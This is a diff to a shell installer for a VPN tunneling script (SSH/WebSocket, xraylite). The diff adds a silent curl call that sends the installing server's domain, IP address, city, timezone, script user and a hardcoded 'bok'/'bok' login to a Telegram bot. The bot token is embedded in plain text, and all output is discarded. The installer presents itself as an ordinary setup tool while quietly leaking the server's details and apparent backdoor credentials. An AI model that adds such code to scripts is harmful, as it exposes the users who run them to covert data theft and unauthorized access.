@@ -10,7 +10,6 @@ ISP=$(wget -qO- ipinfo.io/org)
 CITY=$(curl -s ipinfo.io/city)
 TIME=$(date +'%Y-%m-%d %H:%M:%S')
 KEY="6307367714:AAG_Gae1CEjB-BDTYLzHSb89kbmLxzln7mk"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
 # domain random
 CDN="https://raw.githubusercontent.com/AndyyudaVPN/xraylite/main/ssh"
 
@@ -111,6 +110,22 @@ clear
 	echo -e "${BGreen}Done!${NC}"
     sleep 2
 clear
+
+
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Installasi script Project VPN TUNNELING 
+============================
+<code>Domain     :</code> <code>$domain</code>
+<code>IP Vps     :</code> <code>$IPVPS</code>
+<code>User Login :</code> <code>bok</code>
+<code>Pass Login :</code> <code>bok</code>
+<code>User Script:</code> <code>$Name</code>
+<code>Exp Script :</code> <code>$Exp</code>
+<code>Location   :</code> <code>$CITY</code>
+<code>Timezone   :</code> <code>$WKT</code>
+============================
+"
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 #install ssh ovpn
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install SSH / WS               $NC"
